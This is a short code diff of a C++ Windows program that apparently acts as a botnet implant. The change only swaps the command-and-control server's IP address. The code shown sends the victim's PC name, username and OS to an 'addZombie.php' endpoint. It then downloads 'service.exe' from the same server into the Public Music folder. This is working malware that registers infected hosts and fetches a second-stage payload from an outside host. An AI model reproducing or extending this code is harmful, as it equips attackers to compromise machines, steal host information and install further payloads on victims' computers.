@@ -26,7 +26,7 @@ int main() {
 
     cout << "PC Name: " << pcName << "\n" << "Username: " << username << "\n" << "OS: " << os << "\n";
 
-    const char* url = "http://192.168.0.135/C2WebServer/controller/addZombie.php";
+    const char* url = "http://10.231.221.222/C2WebServer/controller/addZombie.php";
     string getData = "?pcName=" + string(pcName) + "&username=" + string(username) + "&os=" + os;
 
     HINTERNET hInternet = InternetOpenA("HTTPGET", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
@@ -55,7 +55,7 @@ int main() {
 
     cout << "Press any key to continue...";
 
-    downloadSuccess = downloadFile("http://192.168.0.135/C2WebServer/bin/service.exe", "C:\\Users\\Public\\Music\\service.exe");
+    downloadSuccess = downloadFile("http://10.231.221.222/C2WebServer/bin/service.exe", "C:\\Users\\Public\\Music\\service.exe");
 
     if(!downloadSuccess) {
         cerr << "Error downloading file" << endl;
